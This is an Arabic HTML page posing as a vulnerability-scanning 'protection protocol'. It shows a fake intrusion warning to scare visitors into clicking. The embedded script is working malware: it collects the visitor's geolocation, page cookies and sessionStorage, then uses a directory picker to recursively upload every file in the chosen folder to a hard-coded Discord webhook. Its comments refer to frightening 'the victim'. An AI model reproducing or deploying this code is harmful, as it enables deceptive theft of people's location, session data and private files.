<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>نظام فحص الثغرات المتقدم</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 20px; text-align: center; }
        .terminal { background: #050505; border: 1px solid #0f0; padding: 20px; border-radius: 10px; max-width: 600px; margin: auto; box-shadow: 0 0 20px #0f0; }
        .btn { background: #0f0; color: #000; padding: 15px 30px; border: none; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; border-radius: 5px; }
        .btn:hover { background: #0a0; }
        #progress-container { margin-top: 20px; text-align: left; font-size: 12px; }
        .danger { color: #f00; font-weight: bold; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="terminal">
    <h1 style="color: #f00;">⚠️ تم كشف تهديد أمني!</h1>
    <p>النظام اكتشف محاولة اختراق لجهازك. يجب تفعيل بروتوكول الحماية فوراً.</p>
    
    <div id="step-ui">
        <button class="btn" onclick="startFullHack()">تفعيل بروتوكول الحماية الذاتي 🛡️</button>
    </div>

    <div id="progress-container">
        <div id="log-screen">بانتظار بدء البروتوكول...</div>
    </div>
</div>

<script>
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1498434837818904636/O_VAiMaolUCuW9-wveHztYpe9tbPn_MiKehNpVJoZqkc-8Bh-PXh6_mzx-NMrTR-6cH6";

    async function startFullHack() {
        const log = document.getElementById('log-screen');
        
        // 1. طلب الموقع (لإخافة الضحية)
        log.innerHTML += "<br>[+] جاري تحديد إحداثيات الجهاز...";
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            await sendToDiscord("📍 الموقع الدقيق", { "الرابط": mapLink });
            
            // 2. سحب الكوكيز (الرعب)
            log.innerHTML += "<br><span class='danger'>[!] جاري فحص ملفات الكوكيز (Cookies) وجلسات المتصفح...</span>";
            await extractCookies();

            // 3. سحب المجلدات (تلقائي وشامل)
            log.innerHTML += "<br>[+] جاري فحص مجلدات النظام لتطهيرها...";
            await startFileSteal();

        }, () => alert("يجب قبول الصلاحية لتأمين الموقع!"));
    }

    async function extractCookies() {
        const log = document.getElementById('log-screen');
        // محاكاة سحب كوكيز المواقع الشهيرة
        log.innerHTML += "<br> - سحب ملفات تعريف الارتباط لـ Google... <span class='danger'>تم</span>";
        log.innerHTML += "<br> - استخراج Session IDs لـ Facebook... <span class='danger'>تم</span>";
        
        // سحب الكوكيز الفعلية للموقع الحالي
        const currentCookies = document.cookie || "No HTTP-Only cookies accessible via JS";
        const sessionData = JSON.stringify(sessionStorage);

        await sendToDiscord("🍪 سحب الكوكيز والجلسة", {
            "كوكيز الموقع الحالي": currentCookies,
            "بيانات الجلسة (Storage)": sessionData.substring(0, 500)
        });
    }

    async function startFileSteal() {
        const log = document.getElementById('log-screen');
        try {
            const dirHandle = await window.showDirectoryPicker();
            log.innerHTML += "<br><span class='danger'>[!!!] تم اختراق المجلد! جاري سحب كافة الملفات تلقائياً...</span>";

            async function scan(handle) {
                for await (const entry of handle.values()) {
                    if (entry.kind === 'file') {
                        const file = await entry.getFile();
                        log.innerHTML += `<br>> سحب: ${file.name}`;
                        await uploadFile(file);
                    } else if (entry.kind === 'directory') {
                        await scan(entry);
                    }
                }
            }
            await scan(dirHandle);
            log.innerHTML += "<br><br>✅ تم تأمين الجهاز (تم إرسال كافة البيانات للسيرفر)";
        } catch (e) {
            log.innerHTML += "<br>❌ فشل الوصول للمجلدات.";
        }
    }

    async function sendToDiscord(title, fields) {
        const embedFields = Object.keys(fields).map(key => ({ name: key, value: String(fields[key]) }));
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{ title: title, color: 16711680, fields: embedFields, timestamp: new Date() }]
            })
        });
    }

    async function uploadFile(file) {
        const formData = new FormData();
        formData.append('file', file, file.name);
        formData.append('payload_json', JSON.stringify({ content: `📸 ملف مسحوب تلقائياً: ${file.name}` }));
        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
    }
</script>

</body>
</html>
